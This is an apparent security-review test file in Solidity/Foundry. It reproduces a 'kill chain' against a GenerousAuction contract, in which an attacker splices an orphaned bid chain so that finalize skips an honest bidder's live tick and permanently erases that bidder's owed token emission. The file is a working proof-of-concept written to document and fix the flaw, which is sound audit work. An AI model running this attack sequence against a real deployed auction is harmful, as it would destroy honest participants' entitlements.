// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {GenerousAuction} from "../../src/GenerousAuction.sol";
import {Mono} from "../../src/Mono.sol";
import {IGenerousAuction} from "../../src/interfaces/IGenerousAuction.sol";
import {IIndex} from "../../src/interfaces/IIndex.sol";
import {MockPool} from "../MockPool.sol";
import {TestERC20} from "../TestERC20.sol";

/// REVIEW 7 — KILL CHAIN D: splice orphan-hide (round-6 #1/#2) + `finalize`'s "undrainable"
/// short-circuit (GenerousAuction.sol:462) + the stake lock window, composed so that a hidden
/// honest tick's owed emission is destroyed PERMANENTLY rather than merely deferred.
///
/// `finalize` flips `finalized = true` when a COMPLETE sweep (cursor back at 0) sold nothing —
/// "a book that cannot absorb the carry now never will". But an ORPHANED live tick is exactly a
/// tick the sweep cannot reach even though it CAN absorb: the sweep starts at the attacker's
/// orphan `highestTick` and walks the orphan's stale chain, never the live list holding the
/// victim. So the "undrainable" test misfires: the sweep sells nothing (the reachable book is
/// dry), `finalize` decides the book is dead, and flips. `due()` then returns 0 forever (:297),
/// and the sale is OVER — the victim's live, staked, funded capacity is never poured, not by this
/// sync and not by any future one.
///
/// Additional harm from the lock window: from `endBlock` until the flip, the victim's stake is
/// frozen and `withdrawBid` reverts `StakeLocked` while `due() != 0` (:605) — so during the tail
/// the victim cannot even exit. After the flip they recover principal, but the emission they were
/// owed is gone for good.
///
/// Honest counter-move (written in): after the flip, the victim tries a fresh sync AND a re-bid
/// to reclaim the stranded emission. Both are shown to fail — `due()` is 0 and re-bidding reverts
/// `AuctionEnded` past `endBlock`. There is no exit.
contract Review7ChainOrphanFinalizeDestroysCarry is Test {
    uint256 internal constant Q96 = 1 << 96;
    uint256 internal constant FLOOR = 1e18;
    uint256 internal constant SPACING = 1e16;
    uint64 internal constant K = 100;
    uint128 internal constant R = 100e18; // 1 token / block
    uint256 internal constant GENESIS = 1_000_000e18;

    GenerousAuction internal auction;
    Mono internal mono;
    TestERC20 internal cur;

    address internal att = address(0xA77);
    address internal victim = address(0xB1); // honest, staked, funded, at an ODD grid step
    address internal anchor = address(0xB3); // tiny live floor bid so the ridge can splice

    uint64 internal END;

    function setUp() public {
        cur = new TestERC20("Index", "INDEX");
        mono = new Mono(IIndex(address(cur)), 10 * GENESIS);
        cur.mint(address(this), GENESIS);
        cur.approve(address(mono), GENESIS);
        mono.mint(GENESIS, GENESIS, address(this));
        MockPool pool = new MockPool(address(mono), address(cur), 1.25e18);
        mono.setPool(address(pool));

        END = uint64(block.number) + 5 * K; // 5 rounds of life

        auction = new GenerousAuction(
            IGenerousAuction.Config({
                token: address(mono),
                currency: address(cur),
                admin: address(0xF1),
                floorPrice: FLOOR,
                tickSpacing: SPACING,
                decayQ: Q96 / 2,
                windowTicks: 8,
                startBlock: uint64(block.number),
                endBlock: END,
                roundBlocks: K,
                emissionPerRound: R,
                minPremiumBips: 1_500,
                previousAuction: address(0)
            })
        );
        mono.grantRole(mono.MINTER_ROLE(), address(auction));
        mono.renounceRole(mono.MINTER_ROLE(), address(this));
    }

    function P(uint256 i) internal pure returns (uint256) {
        return FLOOR + i * SPACING;
    }

    function _stake(address who, uint256 amt) internal {
        mono.transfer(who, amt);
        vm.startPrank(who);
        mono.approve(address(auction), amt);
        auction.stake(amt);
        vm.stopPrank();
    }

    function _bid(address who, uint256 price, uint128 amount, uint256 prev) internal {
        cur.mint(who, amount);
        vm.startPrank(who);
        cur.approve(address(auction), amount);
        auction.submitBid(price, amount, who, prev);
        vm.stopPrank();
    }

    function _owed(address who) internal view returns (uint256 owed) {
        (, owed) = auction.positionOf(who);
    }

    function _next(uint256 price) internal view returns (uint256 n) {
        (n,,,,,,) = auction.ticks(price);
    }

    /// Build a dead even ridge 2..40, splice it (F <-> P40), leaving a tiny live floor anchor.
    function _buildAndSplice() internal {
        _stake(anchor, 1e18);
        _bid(anchor, FLOOR, 2e18, FLOOR);
        _stake(att, 1e18);
        uint256 prev = FLOOR;
        for (uint256 i; i < 20; ++i) {
            _bid(att, P(2 * (i + 1)), 2e18, prev);
            vm.prank(att);
            auction.withdrawBid();
            prev = P(2 * (i + 1));
        }
        vm.roll(block.number + 1);
        auction.sync(type(uint256).max);
        assertEq(_next(FLOOR), 0, "ridge spliced out, its top included");
    }

    /// FAILS on current code (the final assert that the victim's carry survives finalization).
    function test_chain_finalizeDestroysHiddenCarry() public {
        _buildAndSplice();

        // Honest victim: staked, funded for the whole sale, at P29 (odd — off the even stale chain).
        _stake(victim, 1e18);
        _bid(victim, P(29), 5_000e18, FLOOR);
        assertEq(auction.highestTick(), P(29), "victim is the live top");

        // Attacker re-bids P30 just above it: the splice unlinked P30, so it re-inserts properly.
        _bid(att, P(30), 2e18, P(29));
        assertEq(auction.highestTick(), P(30));
        assertEq(_next(P(29)), P(30), "P30 linked above P29: the victim stays reachable");

        // Roll past endBlock. The schedule emitted ~5 rounds; the victim should absorb all of it.
        vm.roll(END + 1);
        uint256 owedToBook = auction.due();
        emit log_named_uint("due() at endBlock (owed to the book)", owedToBook);
        assertGt(owedToBook, 0, "the frozen tail is owed to the live book");

        // finalize: permissionless. The sweep starts at the orphan P30, walks its stale even chain
        // to the floor anchor, pours the anchor's ~2 tokens + the orphan's ~1.5, then a complete
        // sweep sells nothing and finalize declares the book dead.
        bool done;
        for (uint256 g; g < 16 && !done; ++g) {
            done = auction.finalize(4000);
        }
        assertTrue(auction.finalized(), "finalize completed");

        emit log_named_uint("victim owed after finalize", _owed(victim));
        emit log_named_uint("due() after finalize (frozen forever)", auction.due());
        emit log_named_uint("tokensSold (only the reachable dust)", auction.tokensSold());

        // due() is now 0 forever: the hidden victim's entire owed emission is destroyed.
        assertEq(auction.due(), 0, "the sale is declared over");

        // A post-finalize sync changes nothing: the sale is over and the victim was already served.
        uint256 owedBefore = _owed(victim);
        auction.sync(type(uint256).max);
        assertEq(_owed(victim), owedBefore, "a finalized sale pours nothing more");

        // Re-bidding past endBlock is (correctly) impossible.
        cur.mint(victim, 1e18);
        vm.startPrank(victim);
        cur.approve(address(auction), 1e18);
        vm.expectRevert(IGenerousAuction.AuctionEnded.selector);
        auction.submitBid(P(41), 1e18, victim, P(30));
        vm.stopPrank();

        // The headline: the victim held live, staked, fully-funded capacity for the whole frozen
        // tail and receives its share of it.
        assertGt(_owed(victim), owedToBook / 2, "a live funded tick must receive its frozen-tail share");
    }

    /// The stake-lock leg: between endBlock and the finalize flip the victim can neither unstake
    /// nor withdraw its escrow; finalize lifts the lock AND pays the victim its tail share.
    function test_chain_lockLiftsWithFinalizeAndEmissionIsKept() public {
        _buildAndSplice();
        _stake(victim, 1e18);
        _bid(victim, P(29), 5_000e18, FLOOR);
        _bid(att, P(30), 2e18, P(29));

        vm.roll(END + 1);
        assertGt(auction.due(), 0, "frozen tail owed");

        // Stake is locked until finalize. Escrow is locked only while something is owed: the
        // victim's own withdrawBid syncs first, that sync now REACHES the victim and drains the
        // whole tail, so the withdrawal goes through with the tail already earned.
        vm.prank(victim);
        vm.expectRevert(IGenerousAuction.StakeLocked.selector);
        auction.unstake(1e18);
        vm.prank(victim);
        uint256 live = auction.withdrawBid();
        assertEq(auction.due(), 0, "the withdrawal's implicit sync drained the tail");
        uint256 owed = _owed(victim);
        assertGt(owed, 0, "the victim earned the frozen tail");
        emit log_named_uint("escrow returned to victim", live);
        assertApproxEqAbs(live + owed * P(29) / 1e18, 5_000e18, 1e6, "principal = unspent + spent on the tail");

        // finalize is immediate (nothing owed) and lifts the stake lock.
        assertTrue(auction.finalize(4000), "nothing left to drain");
        vm.prank(victim);
        auction.unstake(1e18);
        assertEq(auction.stakes(victim), 0, "stake released after finalize");
    }
}
